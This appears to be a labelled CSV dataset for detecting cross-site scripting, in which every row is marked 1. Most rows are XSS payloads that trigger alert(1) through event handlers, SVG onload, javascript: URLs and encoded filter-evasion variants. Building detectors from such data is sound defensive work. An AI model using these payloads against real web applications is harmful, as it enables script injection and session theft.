Sentence,Label
"<LINK REL=""stylesheet"" HREF=""http://.rocks/.css"">",1
<picture onpointerover=alert(1)>XSS</picture>,1
<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>,1
"<nextid draggable=""true"" ondragenter=""alert(1)"">test</nextid>",1
"<address draggable=""true"" ondragleave=""alert(1)"">test</address>",1
<th onpointerenter=alert(1)>XSS</th>,1
<html onpointerdown=alert(1)>XSS</html>,1
<strike id=x tabindex=1 onactivate=alert(1)></strike>,1
"<ol onbeforecopy=""alert(1)"" contenteditable>test</ol>",1
"<noframes onkeydown=""alert(1)"" contenteditable>test</noframes>",1
"<plaintext onkeypress=""alert(1)"" contenteditable>test</plaintext>",1
<thead onpointerover=alert(1)>XSS</thead>,1
<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>,1
<li id=x tabindex=1 onfocusin=alert(1)></li>,1
<slot onpointerover=alert(1)>XSS</slot>,1
<area onpointerup=alert(1)>XSS</area>,1
<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>,1
"<caption ondblclick=""alert(1)"">test</caption>",1
"<sup onkeydown=""alert(1)"" contenteditable>test</sup>",1
"<nav onmousemove=""alert(1)"">test</nav>",1
"<bdo onkeyup=""alert(1)"" contenteditable>test</bdo>",1
"<tt oncut=""alert(1)"" contenteditable>test</tt>",1
<rt id=x tabindex=1 onfocus=alert(1)></rt>,1
<nav onblur=alert(1) tabindex=1 id=x></nav><input autofocus>,1
<blink id=x tabindex=1 onfocus=alert(1)></blink>,1
"<style>@keyframes slidein {}</style><template style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></template>",1
"<cite onbeforecut=""alert(1)"" contenteditable>test</cite>",1
"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>",1
<set onpointerdown=alert(1)>XSS</set>,1
<svg><slot onload=alert(1)></slot>,1
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>,1
"<data oncopy=""alert(1)"" contenteditable>test</data>",1
<a onpointerenter=alert(1)>XSS</a>,1
<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>,1
"<small onkeypress=""alert(1)"" contenteditable>test</small>",1
<s id=x tabindex=1 onactivate=alert(1)></s>,1
"<style>@keyframes slidein {}</style><p style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></p>",1
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionend=alert(1)></style>",1
<frame onpointerup=alert(1)>XSS</frame>,1
<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>,1
"<fieldset onbeforecut=""alert(1)"" contenteditable>test</fieldset>",1
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",1
<svg><picture onload=alert(1)></picture>,1
"<meter onmousemove=""alert(1)"">test</meter>",1
"<time draggable=""true"" ondragenter=""alert(1)"">test</time>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></title>",1
"<image draggable=""true"" ondragenter=""alert(1)"">test</image>",1
"<style>@keyframes x{}</style><link style=""animation-name:x"" onanimationend=""alert(1)""></link>",1
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationstart=""alert(1)""></wbr>",1
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>",1
<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>,1
"<acronym onclick=""alert(1)"">test</acronym>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></label>",1
"<div draggable=""true"" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>",1
"<col draggable=""true"" ondragstart=""alert(1)"">test</col>",1
"<video onbeforecopy=""alert(1)"" contenteditable>test</video>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",1
"<head draggable=""true"" ondrag=""alert(1)"">test</head>",1
"<progress onbeforecut=""alert(1)"" contenteditable>test</progress>",1
<xss id=x tabindex=1 onfocusin=alert(1)></xss>,1
"<map onclick=""alert(1)"">test</map>",1
"<var ondblclick=""alert(1)"">test</var>",1
<img onpointermove=alert(1)>XSS</img>,1
"<map oncopy=""alert(1)"" contenteditable>test</map>",1
<iframe id=x tabindex=1 onactivate=alert(1)></iframe>,1
"<frame onkeypress=""alert(1)"" contenteditable>test</frame>",1
<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>,1
<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>,1
"<element draggable=""true"" ondragenter=""alert(1)"">test</element>",1
<tbody onpointerout=alert(1)>XSS</tbody>,1
<svg><wbr onload=alert(1)></wbr>,1
"<div draggable=""true"" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></img>",1
"<link onclick=""alert(1)"">test</link>",1
<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>,1
<rtc onpointerover=alert(1)>XSS</rtc>,1
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationstart=""alert(1)""></map>",1
<html id=x tabindex=1 onfocus=alert(1)></html>,1
"<content onkeypress=""alert(1)"" contenteditable>test</content>",1
"<iframe onmouseout=""alert(1)"">test</iframe>",1
<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>,1
"<style>@keyframes slidein {}</style><source style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></source>",1
"<meter onmouseleave=""alert(1)"">test</meter>",1
"<content onbeforecut=""alert(1)"" contenteditable>test</content>",1
"<address onmouseleave=""alert(1)"">test</address>",1
<progress id=x tabindex=1 onfocus=alert(1)></progress>,1
"<h1 onmousemove=""alert(1)"">test</h1>",1
"<input onclick=""alert(1)"">test</input>",1
<big id=x tabindex=1 onfocusin=alert(1)></big>,1
"<video draggable=""true"" ondragstart=""alert(1)"">test</video>",1
"<u draggable=""true"" ondragend=""alert(1)"">test</u>",1
<button id=x tabindex=1 onactivate=alert(1)></button>,1
<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>,1
<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>,1
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,1
"<figcaption onmousedown=""alert(1)"">test</figcaption>",1
"<style>:target {transform: rotate(180deg);}</style><del id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></del>",1
"<div draggable=""true"" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable>drop here</aside>",1
"<u oncopy=""alert(1)"" contenteditable>test</u>",1
<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>,1
"<noembed onmouseleave=""alert(1)"">test</noembed>",1
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",1
<svg><cite onload=alert(1)></cite>,1
"<a oncontextmenu=""alert(1)"">test</a>",1
"<slot onmousemove=""alert(1)"">test</slot>",1
"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>",1
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",1
"<aside onclick=""alert(1)"">test</aside>",1
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,1
<template onpointerleave=alert(1)>XSS</template>,1
<samp onpointerout=alert(1)>XSS</samp>,1
"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",1
"<output oncontextmenu=""alert(1)"">test</output>",1
"<spacer onmousedown=""alert(1)"">test</spacer>",1
<nextid onpointerup=alert(1)>XSS</nextid>,1
"<embed onkeyup=""alert(1)"" contenteditable>test</embed>",1
"<label draggable=""true"" ondragstart=""alert(1)"">test</label>",1
<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>,1
"<ins onmouseover=""alert(1)"">test</ins>",1
<progress onpointerout=alert(1)>XSS</progress>,1
"<cite ondblclick=""alert(1)"">test</cite>",1
<img2 onpointerover=alert(1)>XSS</img2>,1
"<details onmouseleave=""alert(1)"">test</details>",1
<body onmessage=alert(1)>,1
"<frame onbeforecopy=""alert(1)"" contenteditable>test</frame>",1
"<dir onpaste=""alert(1)"" contenteditable>test</dir>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><command id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></command>",1
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",1
<img id=x tabindex=1 onfocus=alert(1)></img>,1
<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>,1
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,1
<span onpointerup=alert(1)>XSS</span>,1
"<figcaption draggable=""true"" ondragend=""alert(1)"">test</figcaption>",1
"<style>:target {color: red;}</style><xmp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></xmp>",1
"<ol draggable=""true"" ondragend=""alert(1)"">test</ol>",1
<svg><tt onload=alert(1)></tt>,1
<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>,1
"<b onmousemove=""alert(1)"">test</b>",1
<strong onpointerup=alert(1)>XSS</strong>,1
"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>",1
"<ul onpaste=""alert(1)"" contenteditable>test</ul>",1
"<bgsound draggable=""true"" ondragenter=""alert(1)"">test</bgsound>",1
"<noframes draggable=""true"" ondrag=""alert(1)"">test</noframes>",1
<aside onpointerdown=alert(1)>XSS</aside>,1
<svg><basefont onload=alert(1)></basefont>,1
"<rb ondblclick=""alert(1)"">test</rb>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></image>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ul id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ul>",1
<listing onpointerdown=alert(1)>XSS</listing>,1
<iframe id=x onfocus=alert(1)>,1
"<i onclick=""alert(1)"">test</i>",1
"<svg onmousemove=""alert(1)"">test</svg>",1
<rb onpointerdown=alert(1)>XSS</rb>,1
"<content onmouseenter=""alert(1)"">test</content>",1
"<picture oncontextmenu=""alert(1)"">test</picture>",1
"<style>:target {color:red;}</style><dir id=x style=""transition:color 1s"" ontransitionend=alert(1)></dir>",1
"<s onmousemove=""alert(1)"">test</s>",1
"<dd onmouseenter=""alert(1)"">test</dd>",1
"<span draggable=""true"" ondragstart=""alert(1)"">test</span>",1
"<body onresize=""alert(1)"">",1
"<noframes onmousedown=""alert(1)"">test</noframes>",1
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",1
"<meta onmouseup=""alert(1)"">test</meta>",1
"<strike draggable=""true"" ondrag=""alert(1)"">test</strike>",1
<tt onpointerover=alert(1)>XSS</tt>,1
"<style>:target {transform: rotate(180deg);}</style><aside id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></aside>",1
"<code onmouseleave=""alert(1)"">test</code>",1
"<command draggable=""true"" ondragstart=""alert(1)"">test</command>",1
"<wbr onpaste=""alert(1)"" contenteditable>test</wbr>",1
"<meter onpaste=""alert(1)"" contenteditable>test</meter>",1
"<strong onclick=""alert(1)"">test</strong>",1
<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,1
"<template draggable=""true"" ondragstart=""alert(1)"">test</template>",1
<body onpopstate=alert(1)>,1
<var id=x tabindex=1 onbeforeactivate=alert(1)></var>,1
"<param onclick=""alert(1)"">test</param>",1
<rb id=x tabindex=1 onactivate=alert(1)></rb>,1
"<dialog onmouseenter=""alert(1)"">test</dialog>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></li>",1
"<spacer onmouseleave=""alert(1)"">test</spacer>",1
"<tfoot draggable=""true"" ondragstart=""alert(1)"">test</tfoot>",1
<input type=image onloadend=alert(1) src=validimage.png>,1
"<mark onkeydown=""alert(1)"" contenteditable>test</mark>",1
"<menu draggable=""true"" ondragend=""alert(1)"">test</menu>",1
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",1
"<noscript onmouseout=""alert(1)"">test</noscript>",1
"<spacer onmouseout=""alert(1)"">test</spacer>",1
"<th draggable=""true"" ondragenter=""alert(1)"">test</th>",1
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" ontransitionend=alert(1)></summary>",1
<isindex type=image src=1 onerror=alert(1)>,1
"<li onpaste=""alert(1)"" contenteditable>test</li>",1
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>",1
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationend=""alert(1)""></html>",1
"<kbd oncontextmenu=""alert(1)"">test</kbd>",1
<blink onpointerover=alert(1)>XSS</blink>,1
"<em draggable=""true"" ondragenter=""alert(1)"">test</em>",1
<ol onpointerdown=alert(1)>XSS</ol>,1
"<dir onmouseleave=""alert(1)"">test</dir>",1
<address onpointerup=alert(1)>XSS</address>,1
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,1
"<blockquote onmousemove=""alert(1)"">test</blockquote>",1
"<style>:target {color: red;}</style><datalist id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></datalist>",1
"<basefont onbeforecut=""alert(1)"" contenteditable>test</basefont>",1
"<canvas draggable=""true"" ondragenter=""alert(1)"">test</canvas>",1
<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>,1
<td id=x tabindex=1 onbeforeactivate=alert(1)></td>,1
<image3 onpointermove=alert(1)>XSS</image3>,1
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></em>",1
"<table onmouseup=""alert(1)"">test</table>",1
"<div draggable=""true"" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>",1
<svg><title onload=alert(1)></title>,1
<body id=x tabindex=1 onfocusin=alert(1)></body>,1
"<div oncut=""alert(1)"" contenteditable>test</div>",1
"<strike onmouseout=""alert(1)"">test</strike>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hgroup>",1
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationstart=""alert(1)""></li>",1
<svg><footer onload=alert(1)></footer>,1
"<track draggable=""true"" ondrag=""alert(1)"">test</track>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></small>",1
"<nav onbeforecut=""alert(1)"" contenteditable>test</nav>",1
"<basefont onmousedown=""alert(1)"">test</basefont>",1
<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>,1
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,1
"<style>:target {color:red;}</style><sup id=x style=""transition:color 1s"" ontransitionend=alert(1)></sup>",1
<legend id=x tabindex=1 onfocusin=alert(1)></legend>,1
"<figcaption onkeydown=""alert(1)"" contenteditable>test</figcaption>",1
"<center draggable=""true"" ondragleave=""alert(1)"">test</center>",1
<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>,1
"<pre onmousemove=""alert(1)"">test</pre>",1
"<nextid onmouseenter=""alert(1)"">test</nextid>",1
"<fieldset onmouseleave=""alert(1)"">test</fieldset>",1
"HREF=""javascript:alert('')",1
<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>,1
<option onpointerover=alert(1)>XSS</option>,1
"<var onmouseenter=""alert(1)"">test</var>",1
<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>,1
<spacer onpointermove=alert(1)>XSS</spacer>,1
"<wbr draggable=""true"" ondragend=""alert(1)"">test</wbr>",1
"<span onpaste=""alert(1)"" contenteditable>test</span>",1
<svg><figure onload=alert(1)></figure>,1
"<style>:target {transform: rotate(180deg);}</style><template id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></template>",1
<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>,1
"<output oncut=""alert(1)"" contenteditable>test</output>",1
"<div draggable=""true"" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>",1
"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",1
"<style>@keyframes slidein {}</style><pre style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></pre>",1
<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>,1
"<meta oncontextmenu=""alert(1)"">test</meta>",1
<output id=x tabindex=1 onbeforeactivate=alert(1)></output>,1
"<mark onbeforepaste=""alert(1)"" contenteditable>test</mark>",1
<img id=x tabindex=1 onbeforeactivate=alert(1)></img>,1
"<center onmouseup=""alert(1)"">test</center>",1
"<keygen oncut=""alert(1)"" contenteditable>test</keygen>",1
<noembed onpointerdown=alert(1)>XSS</noembed>,1
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",1
</script><script>alert('');</script>,1
"<i oncontextmenu=""alert(1)"">test</i>",1
"<rtc oncut=""alert(1)"" contenteditable>test</rtc>",1
"<option oncopy=""alert(1)"" contenteditable>test</option>",1
"<div draggable=""true"" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>",1
"<hgroup onmousemove=""alert(1)"">test</hgroup>",1
"<p draggable=""true"" ondragend=""alert(1)"">test</p>",1
<plaintext onpointerover=alert(1)>XSS</plaintext>,1
"<dl onclick=""alert(1)"">test</dl>",1
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationend=""alert(1)""></source>",1
<footer id=x tabindex=1 onfocus=alert(1)></footer>,1
"<object onmouseenter=""alert(1)"">test</object>",1
"<basefont onclick=""alert(1)"">test</basefont>",1
"<article onmouseout=""alert(1)"">test</article>",1
<svg><audio onload=alert(1)></audio>,1
"<col onmouseleave=""alert(1)"">test</col>",1
"<fieldset ondblclick=""alert(1)"">test</fieldset>",1
"<style>:target {color: red;}</style><base id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></base>",1
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",1
"<html draggable=""true"" ondragend=""alert(1)"">test</html>",1
top[‘al\145rt’](1),1
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",1
"<spacer oncopy=""alert(1)"" contenteditable>test</spacer>",1
"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>",1
<bdo onpointerleave=alert(1)>XSS</bdo>,1
"<script onmouseout=""alert(1)"">test</script>",1
"<xmp onclick=""alert(1)"">test</xmp>",1
"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",1
<multicol onpointerleave=alert(1)>XSS</multicol>,1
<marquee id=x tabindex=1 onfocus=alert(1)></marquee>,1
<dialog id=x tabindex=1 ondeactivate=alert(1)></dialog><input id=y autofocus>,1
"<select onpaste=""alert(1)"" contenteditable>test</select>",1
"<source onmouseleave=""alert(1)"">test</source>",1
"<datalist onbeforecut=""alert(1)"" contenteditable>test</datalist>",1
"<tbody ondblclick=""alert(1)"">test</tbody>",1
"<content draggable=""true"" ondragleave=""alert(1)"">test</content>",1
"<param onkeyup=""alert(1)"" contenteditable>test</param>",1
<svg><a onload=alert(1)></a>,1
<nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>,1
<textarea onpointerover=alert(1)>XSS</textarea>,1
"<bgsound onmouseover=""alert(1)"">test</bgsound>",1
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationstart=""alert(1)""></blink>",1
<basefont onpointerenter=alert(1)>XSS</basefont>,1
"<label onmouseleave=""alert(1)"">test</label>",1
"<caption onmouseleave=""alert(1)"">test</caption>",1
"<div draggable=""true"" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>",1
<dd onpointerover=alert(1)>XSS</dd>,1
<sub id=x tabindex=1 onactivate=alert(1)></sub>,1
<small onpointermove=alert(1)>XSS</small>,1
"<noembed draggable=""true"" ondragend=""alert(1)"">test</noembed>",1
<custom tags onpointermove=alert(1)>XSS</custom tags>,1
"<style>:target {transform: rotate(180deg);}</style><spacer id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></spacer>",1
<link rel=stylesheet href=1 onerror=alert(1)>,1
"<xmp draggable=""true"" ondragstart=""alert(1)"">test</xmp>",1
<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>,1
"<dd draggable=""true"" ondragleave=""alert(1)"">test</dd>",1
"<link draggable=""true"" ondragstart=""alert(1)"">test</link>",1
"<body onkeypress=""alert(1)"" contenteditable>test</body>",1
"<progress onpaste=""alert(1)"" contenteditable>test</progress>",1
"<bgsound draggable=""true"" ondragleave=""alert(1)"">test</bgsound>",1
<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>,1
<command onpointerup=alert(1)>XSS</command>,1
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,1
<input onpointerout=alert(1)>XSS</input>,1
"<mark onmousedown=""alert(1)"">test</mark>",1
"<tr onmousedown=""alert(1)"">test</tr>",1
<col onpointerenter=alert(1)>XSS</col>,1
"<strike draggable=""true"" ondragstart=""alert(1)"">test</strike>",1
<keygen onpointerover=alert(1)>XSS</keygen>,1
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",1
"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",1
"<tt onkeyup=""alert(1)"" contenteditable>test</tt>",1
"<option onmouseout=""alert(1)"">test</option>",1
"<track draggable=""true"" ondragenter=""alert(1)"">test</track>",1
"<code draggable=""true"" ondragstart=""alert(1)"">test</code>",1
"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>",1
<form id=x tabindex=1 onfocus=alert(1)></form>,1
"<td onkeyup=""alert(1)"" contenteditable>test</td>",1
<span onpointermove=alert(1)>XSS</span>,1
<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,1
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdi id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bdi>",1
"<samp onmouseout=""alert(1)"">test</samp>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></summary>",1
"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",1
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></img>",1
<tt onpointerenter=alert(1)>XSS</tt>,1
"<option onkeyup=""alert(1)"" contenteditable>test</option>",1
"<section onkeyup=""alert(1)"" contenteditable>test</section>",1
"<plaintext draggable=""true"" ondrag=""alert(1)"">test</plaintext>",1
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",1
<output onpointerout=alert(1)>XSS</output>,1
"<blockquote onmouseout=""alert(1)"">test</blockquote>",1
<element id=x tabindex=1 onbeforeactivate=alert(1)></element>,1
"<style>:target {transform: rotate(180deg);}</style><a id=x style=""transition:transform 									2s"" ontransitionrun=alert(1)></a>",1
<time onpointerover=alert(1)>XSS</time>,1
"<head onmouseleave=""alert(1)"">test</head>",1
"<content onbeforecopy=""alert(1)"" contenteditable>test</content>",1
"<listing onmousemove=""alert(1)"">test</listing>",1
<input2 onpointerenter=alert(1)>XSS</input2>,1
x000003C,1
"<small ondblclick=""alert(1)"">test</small>",1
<i onpointerover=alert(1)>XSS</i>,1
"<basefont draggable=""true"" ondrag=""alert(1)"">test</basefont>",1
"<style>@keyframes x{}</style><basefont style=""animation-name:x"" onanimationstart=""alert(1)""></basefont>",1
<svg><abbr onload=alert(1)></abbr>,1
<noframes onfocusout=alert(1) tabindex=1 id=x></noframes><input autofocus>,1
<meter onpointerout=alert(1)>XSS</meter>,1
<link onpointermove=alert(1)>XSS</link>,1
<option id=x tabindex=1 onactivate=alert(1)></option>,1
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",1
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>,1
"<a onmouseout=""alert(1)"">test</a>",1
"<style>@keyframes slidein {}</style><br style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></br>",1
"<A HREF=""http://0102.0146.0007.00000223/""></A>",1
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",1
"<menu oncut=""alert(1)"" contenteditable>test</menu>",1
"<base onkeypress=""alert(1)"" contenteditable>test</base>",1
<blockquote onpointerleave=alert(1)>XSS</blockquote>,1
"<menu onmouseover=""alert(1)"">test</menu>",1
"<object draggable=""true"" ondrag=""alert(1)"">test</object>",1
"<i oncopy=""alert(1)"" contenteditable>test</i>",1
"<style>@keyframes x{}</style><bgsound style=""animation-name:x"" onanimationstart=""alert(1)""></bgsound>",1
<img2 onpointerleave=alert(1)>XSS</img2>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></wbr>",1
"<style>:target {color:red;}</style><command id=x style=""transition:color 1s"" ontransitionend=alert(1)></command>",1
"<style>:target {color:red;}</style><sub id=x style=""transition:color 1s"" ontransitionend=alert(1)></sub>",1
"<style>@keyframes slidein {}</style><input style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></input>",1
"<legend onkeyup=""alert(1)"" contenteditable>test</legend>",1
"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",1
<link onpointerout=alert(1)>XSS</link>,1
<summary onpointerout=alert(1)>XSS</summary>,1
<input4 onpointerup=alert(1)>XSS</input4>,1
<svg><details onload=alert(1)></details>,1
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,1
"<select oncontextmenu=""alert(1)"">test</select>",1
"<bdi onmouseover=""alert(1)"">test</bdi>",1
<meter id=x tabindex=1 onfocusin=alert(1)></meter>,1
<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>",1
"<keygen draggable=""true"" ondragenter=""alert(1)"">test</keygen>",1
"<div draggable=""true"" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable>drop here</rp>",1
"<video id=x controls onfocusin=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
"<image onbeforepaste=""alert(1)"" contenteditable>test</image>",1
"<output onbeforepaste=""alert(1)"" contenteditable>test</output>",1
"<figcaption onbeforecut=""alert(1)"" contenteditable>test</figcaption>",1
